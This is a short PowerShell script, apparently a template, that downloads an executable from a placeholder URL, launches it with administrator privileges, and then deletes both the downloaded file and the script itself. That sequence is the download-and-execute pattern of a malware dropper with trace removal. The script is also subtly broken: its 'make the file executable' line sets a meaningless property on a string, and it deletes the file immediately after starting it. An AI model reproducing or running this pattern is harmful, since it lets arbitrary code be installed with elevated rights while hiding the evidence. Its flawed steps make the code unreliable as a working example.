# Replace the URL with the URL of the file you want to download
$url = "https://example.com/file.exe"

# Download the file
(New-Object System.Net.WebClient).DownloadFile($url, $url.Split("/")[-1])

# Get the file name
$file_name = $url.Split("/")[-1]

# Make the file executable
$file_name | ForEach-Object {$_.PsIsContainer = $true}

# Execute the file as an administrator
Start-Process -FilePath $file_name -Verb runAs

# Delete the file
Remove-Item -Path $file_name -Force

# Delete the script
Remove-Item -Path $PSCommandPath -Force
